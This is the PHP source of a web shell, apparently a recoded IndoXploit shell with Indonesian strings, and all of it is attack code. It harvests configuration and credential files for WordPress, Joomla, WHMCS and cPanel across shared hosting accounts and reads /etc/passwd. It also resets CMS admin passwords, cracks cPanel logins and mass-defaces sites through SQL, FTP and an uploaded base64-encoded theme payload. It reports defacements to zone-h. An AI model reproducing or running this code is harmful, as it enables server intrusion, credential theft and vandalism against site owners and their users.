					"/home2/$user_fix/public_html/news/configuration.php" => "JoomlaNews",
					"/home2/$user_fix/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home2/$user_fix/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home2/$user_fix/public_html/cms/configuration.php" => "JoomlaCms",
					"/home2/$user_fix/public_html/Main/configuration.php" => "JoomlaMain",
					"/home2/$user_fix/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home2/$user_fix/public_html/main/configuration.php" => "JoomlaMain",
					"/home2/$user_fix/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home2/$user_fix/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home2/$user_fix/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home2/$user_fix/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home2/$user_fix/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home2/$user_fix/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home2/$user_fix/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home2/$user_fix/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home2/$user_fix/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home2/$user_fix/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home2/$user_fix/public_html/Press/configuration.php" => "JoomlaPress",
					"/home2/$user_fix/public_html/press/configuration.php" => "JoomlaPress",
					"/home2/$user_fix/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home2/$user_fix/public_html/wp/configuration.php" => "JoomlaWp",
					"/home2/$user_fix/public_html/WP/configuration.php" => "JoomlaWP",
					"/home2/$user_fix/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home2/$user_fix/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home2/$user_fix/public_html/Portal/configuration.php" => "JoomlaPortal",		

			
					"/home2/$user_fix/public_html/wp-config.php" => "WordPress",
					"/home2/$user_fix/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_fix/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_fix/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home2/$user_fix/public_html/Home/wp-config.php" => "WordPressHome",
					"/home2/$user_fix/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home2/$user_fix/public_html/home/wp-config.php" => "WordPressHome",
					"/home2/$user_fix/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home2/$user_fix/public_html/New/wp-config.php" => "WordPressNew",
					"/home2/$user_fix/public_html/new/wp-config.php" => "WordPressNew",
					"/home2/$user_fix/public_html/News/wp-config.php" => "WordPressNews",
					"/home2/$user_fix/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home2/$user_fix/public_html/news/wp-config.php" => "WordPressNews",
					"/home2/$user_fix/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home2/$user_fix/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home2/$user_fix/public_html/cms/wp-config.php" => "WordPressCms",
					"/home2/$user_fix/public_html/Main/wp-config.php" => "WordPressMain",
					"/home2/$user_fix/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home2/$user_fix/public_html/main/wp-config.php" => "WordPressMain",
					"/home2/$user_fix/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_fix/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home2/$user_fix/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_fix/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home2/$user_fix/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home2/$user_fix/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home2/$user_fix/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home2/$user_fix/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home2/$user_fix/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home2/$user_fix/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home2/$user_fix/public_html/Press/wp-config.php" => "WordPressPress",
					"/home2/$user_fix/public_html/press/wp-config.php" => "WordPressPress",
					"/home2/$user_fix/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home2/$user_fix/public_html/wp/wp-config.php" => "WordPressWp",
					"/home2/$user_fix/public_html/WP/wp-config.php" => "WordPressWP",
					"/home2/$user_fix/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home2/$user_fix/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home2/$user_fix/public_html/Portal/wp-config.php" => "WordPressPortal",
					"/home3/$user_fix/.my.cnf" => "cpanel",
					"/home3/$user_fix/.accesshash" => "WHM-accesshash",
					"/home3/$user_fix/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_fix/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_fix/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_fix/public_html/clientarea/configuration.php" => "WHMCS",			

	
					"/home3/$user_fix/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_fix/public_html/forum/config.php" => "phpBB",
					"/home3/$user_fix/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_fix/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_fix/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_fix/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_fix/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_fix/public_html/application/config/database.php" => "Ellislab",		

			
					"/home3/$user_fix/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_fix/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home3/$user_fix/public_html/central/configuration.php" => "WHM Central",
					"/home3/$user_fix/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home3/$user_fix/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_fix/public_html/submitticket.php" => "WHMCS",				

						
					"/home3/$user_fix/public_html/configuration.php" => "Joomla",				

	
					"/home3/$user_fix/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_fix/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_fix/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home3/$user_fix/public_html/Home/configuration.php" => "JoomlaHome",
					"/home3/$user_fix/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home3/$user_fix/public_html/home/configuration.php" => "JoomlaHome",
					"/home3/$user_fix/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home3/$user_fix/public_html/New/configuration.php" => "JoomlaNew",
					"/home3/$user_fix/public_html/new/configuration.php" => "JoomlaNew",
					"/home3/$user_fix/public_html/News/configuration.php" => "JoomlaNews",
					"/home3/$user_fix/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home3/$user_fix/public_html/news/configuration.php" => "JoomlaNews",
					"/home3/$user_fix/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home3/$user_fix/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home3/$user_fix/public_html/cms/configuration.php" => "JoomlaCms",
					"/home3/$user_fix/public_html/Main/configuration.php" => "JoomlaMain",
					"/home3/$user_fix/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home3/$user_fix/public_html/main/configuration.php" => "JoomlaMain",
					"/home3/$user_fix/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home3/$user_fix/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home3/$user_fix/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home3/$user_fix/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home3/$user_fix/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home3/$user_fix/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home3/$user_fix/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home3/$user_fix/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home3/$user_fix/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home3/$user_fix/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home3/$user_fix/public_html/Press/configuration.php" => "JoomlaPress",
					"/home3/$user_fix/public_html/press/configuration.php" => "JoomlaPress",
					"/home3/$user_fix/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home3/$user_fix/public_html/wp/configuration.php" => "JoomlaWp",
					"/home3/$user_fix/public_html/WP/configuration.php" => "JoomlaWP",
					"/home3/$user_fix/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home3/$user_fix/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home3/$user_fix/public_html/Portal/configuration.php" => "JoomlaPortal",		

			
					"/home3/$user_fix/public_html/wp-config.php" => "WordPress",
					"/home3/$user_fix/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home3/$user_fix/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home3/$user_fix/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home3/$user_fix/public_html/Home/wp-config.php" => "WordPressHome",
					"/home3/$user_fix/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home3/$user_fix/public_html/home/wp-config.php" => "WordPressHome",
					"/home3/$user_fix/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home3/$user_fix/public_html/New/wp-config.php" => "WordPressNew",
					"/home3/$user_fix/public_html/new/wp-config.php" => "WordPressNew",
					"/home3/$user_fix/public_html/News/wp-config.php" => "WordPressNews",
					"/home3/$user_fix/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home3/$user_fix/public_html/news/wp-config.php" => "WordPressNews",
					"/home3/$user_fix/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home3/$user_fix/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home3/$user_fix/public_html/cms/wp-config.php" => "WordPressCms",
					"/home3/$user_fix/public_html/Main/wp-config.php" => "WordPressMain",
					"/home3/$user_fix/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home3/$user_fix/public_html/main/wp-config.php" => "WordPressMain",
					"/home3/$user_fix/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home3/$user_fix/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home3/$user_fix/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home3/$user_fix/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home3/$user_fix/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home3/$user_fix/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home3/$user_fix/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home3/$user_fix/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home3/$user_fix/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home3/$user_fix/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home3/$user_fix/public_html/Press/wp-config.php" => "WordPressPress",
					"/home3/$user_fix/public_html/press/wp-config.php" => "WordPressPress",
					"/home3/$user_fix/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home3/$user_fix/public_html/wp/wp-config.php" => "WordPressWp",
					"/home3/$user_fix/public_html/WP/wp-config.php" => "WordPressWP",
					"/home3/$user_fix/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home3/$user_fix/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home3/$user_fix/public_html/Portal/wp-config.php" => "WordPressPortal"		
					...
					foreach($grab_config as $config => $nama_config) {
						...
						if($ambil_config == '') {
							...
							$file_config = fopen("fix_config/$user_fix-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/fix_config'><font color=aqua>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=

$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		...
		if($passwd == '' || !$etc) {
			...
			foreach($user_jumping[1] as $user_idx_jump) {
				...
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=aqua>R</font>] <a href='?dir=$user_jumping_dir'><font 

color=gold>$user_jumping_dir</font></a><br>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=aqua>RW</font>] <a href='?dir=$user_jumping_dir'><font 
...
color=gold>$user_jumping_dir</font></a><br>";
					...
					if($domain_jump == '') {
						echo " => ( <font color=white>gabisa ambil nama domain nya</font> )<br>";
					} else {
						preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach($domains_jump[1] as $dj) {
							$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/
...
nya</font><br>";
					...
					if(!$update OR !$conn OR !$db) {
						...
						echo "Status => <font color=aqua>sukses edit user, silakan login dengan 

user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
					...
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=white>error, gabisa ambil nama domain 

nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>

$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET 
...
nyaa</font><br>";
						...
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>
...
nyaa</font><br>";
						...
						$url_target = "Login => <a href='$target' target='_blank'><u>
...
nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=white>error, gabisa ambil nama 
...
domain nyaa</font><br>";
							...
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' 

target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a 

href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' 

target='_blank'><u>$target2</u></a> [ <font color=white>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						...
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' 

target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' 

target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>

$target</u></a> [ <font color=white>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET 
...
user & pass yang baru.</font><br><br>";
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='Fix404' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='Fix404' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: 

/home/user/public_html/nama_folder_config )</span><br>
		";
	}
...
("WSO.php","dz.php","cpanel.php","cpn.php","sql.php","mysql.php","madspot.php","cp.php","cpbt.php","sYm.php",
"x.php","r99.php","lol.php","jo.php","port.php","wp.php","whmcs.php","shellz.php","d0main.php","d0mains.php","users.php",
...
"admins/","admins.asp","admins.php","wp.zip","wso2.5.1","pasir.php","pasir2.php","up.php","cok.php","newfile.php","upl.php"

,".php","a.php","crot.php","kontol.php","hmei7.php","jembut.php","memek.php","tai.php","rabit.php","indoxploit.php","a.php"

,"hemb.php","hack.php","galau.php","HsH.php","indoXploit.php","asu.php","wso.php","lol.php","idx.php","rabbit.php","1n73cti

on.php","k.php","mailer.php","mail.php","temp.php","c.php","d.php","IDB.php","indo.php","indonesia.php","semvak.php","ndasm

u.php","fix.php","as.php","ad.php","aa.php","file.php","peju.php","asd.php","configs.php","ass.php","z.php");
			...
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
						...
						$_SESSION[$pcp] = "1";
						$i++;
						echo "username (<font color=aqua>$ucp</font>) password (<font color=aqua>
...
$pcp</font>)<br>";
		...
		if($i == 0) {
			...
			echo "<br>Nemu ".$i." Cpanel by <font color=aqua>Fix404</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		...
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di 

dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
...
post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='o

pen',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE 

option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=white>error, gabisa ambil nama domain nya</font> -> ";
				} else {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked By Fix404' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' 

value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di 

isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 

450px; height: 150px;'></textarea><br>
...
/home/user/public_html/nama_folder_config )</span><br>
	...
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' 

target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' 

target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=

$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"white\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=aqua>OK</font><br>";
			} else {
				echo "$url -> <font color=white>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Fix404'><br>
		<u>Domains</u>: <br>
				...
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
						...
						if($ucp == '' || $pcp == '') {
							...
							echo "[+] username (<font color=aqua>$ucp</font>) password (<font 

color=aqua>$pcp</font>)<br>";
							$ftp_conn = ftp_connect(gethostbyname($_SERVER['HTTP_HOST']));
							$ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
							if((!$ftp_login) || (!$ftp_conn)) {
								echo "[+] <font color=white>Login Gagal</font><br><br>";
							} else {
								echo "[+] <font color=aqua>Login Sukses</font><br>";
								$fi = htmlspecialchars($_POST['file_deface']);
								$deface = ftp_put($ftp_conn, "public_html/$fi", $_POST

['deface'], FTP_BINARY);
								if($deface) {
									$i++;
									echo "[+] <font color=aqua>Deface 
...
("/etc/named.conf");	
										if($domain_cp == '') {
											echo "[+] <font color=white>gabisa 

ambil nama domain nya</font><br><br>";
										} else {
											preg_match_all("#/var/named/

(.*?).db#", $domain_cp, $domains_cp);
											foreach($domains_cp[1] as $dj) {
												$user_cp_url = 

posix_getpwuid(@fileowner("/etc/valiases/$dj"));
												$user_cp_url = 
...
href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
													break;
												}
											}
										}
									} else {
										echo "[+] <font color=white>gabisa ambil 

nama domain nya</font><br><br>";
									}
								} else {
									echo "[-] <font color=white>Deface 
...
color=aqua>$pcp</font>)<br>";
		...
		if($i == 0) {
			...
			echo "<br>Sukses Deface ".$i." Cpanel by <font color=aqua>Fix404.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		...
		Deface Page: <br>
		<input type='text' name='deface' placeholder='http://www.web-yang-udah-do-deface.com/filemu.php' 
...
dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
 ...
 elseif($_GET['do'] == 'cgi') {
	...
	function reverse($url) {
		...
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace

("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", 

str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
	...
	if($_POST['reverse']) {
		...
		foreach($site as $url) {
			...
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font 

color=aqua>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
...
/home/user/public_html.</center>";
	...
	if(file_exists('adminer.php')) {
		echo "<center><font color=aqua><a href='$full/adminer.php' target='_blank'>-> adminer login <-
		...
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			...
			echo "<center><font color=white>gagal buat file adminer</font></center>";
		}
	}
...
Firefox/32.0");
		...
		foreach($link_config as $dir_config) {
			...
			if(preg_match("/WordPress/", $config)) {
				...
				$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE 
...
ID='$id'");
				if(!$conn OR !$db OR !$update) {
					...
					$b1 = anucurl($site2);
					$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-
...
("");
					$www = "m.php";
					$fp5 = fopen($www,"w");
					fputs($fp5,$upload3);
					$post2 = array(
					...
					if(preg_match("#$script#is", $bs)) {
            	        ...
            	        echo "[-] <font color='white'>gagal mepes...</font><br>";
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By Fix404' requiwhite><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form>
		<br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: 

/home/user/public_html/nama_folder_config )</span>
		</center>";
	}
...
Firefox/32.0");
		...
		foreach($link as $dir_config) {
			...
			if(!$conn OR !$db OR !$update) {
				...
				$site2 = "$target/wp-admin/theme-install.php?upload";
				$b1 = anucurl($site2);
				$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" 
...
aWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
		...
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; 

height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By Fix404' requiwhite><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
	...
	function Delete($path)
{
	...
	if($delete_dir) {
		...
		$act = "<font color=white>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=aqua>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET

['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=

$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a 

href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
...
['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=
...
['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=

$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ 

<a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	...
	if(is_dir($dir) == true) {
		...
		<tr>
		<th class="th_home"><font color="white"><center>Name</center></font></th>
		<th class="th_home"><center><font color="white">Type</center></th>
		<th class="th_home"><center><font color="white">Size</center></th>
		<th class="th_home"><center><font color="white">Last Modified</center></th>
		<th class="th_home"><center><font color="white">Permission</center></th>
		<th class="th_home"><center><font color="white">Action</center></th>
  		</tr>';
		...
		foreach($scandir as $dirx) {
			...
			$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
 			...
 			if($dirx === '.' || $dirx === '..') {
 				$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=

$dir'>newfolder</a>";
 				} else {
 				$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?

act=delete_dir&dir=$dir/$dirx'>delete</a>";
 			}
 			echo "<tr>";
 			echo "<td class='td_home'><img 

src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgAL

AAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4f

BIBADs='>$href</td>";
			echo "<td class='td_home'><center><font color='white'>$dtype</center></td>";
			echo "<td class='td_home'><center><font color='white'>-</center></th>";
			echo "<td class='td_home'><center><font color='white'>$dtime</center></td>";
			echo "<td class='td_home'><center><font color='white'>".w("$dir/$dirx",perms("$dir/

$dirx"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><font color='white'>$act_dir</td>";
		}
		echo "</tr>";
...
src='data:image/png;base64,'><a href='?act=view&dir=$dir&file=

$dir/$file'><font color='white'>$file</a></td>";
			echo "<td class='td_home'><center><font color='white'>$ftype</center></td>";
			echo "<td class='td_home'><center><font color='white'>$size</center></td>";
			echo "<td class='td_home'><center><font color='white'>$ftime</center></td>";
			echo "<td class='td_home'><center><font color='white'>".w("$dir/$file",perms("$dir/

$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/

$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/

$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
		}
		echo "</tr></table>";
	} else {
		echo "<font color=white>can't open directory</font>";
	}
	}
echo "<center><hr><form>
...
</form>Copyright &copy; ".date("Y")." - <a href='http://forum.indoxploit.or.id/' target='_blank'><font 

color=cyan>IndoXploit</font></a> Shell Recoded By <a href='https://www.facebook.com/zoreforce' target='_BLANK'><font 

color=cyan>Fix404</a></font></center>";
?>
</font>
</html>
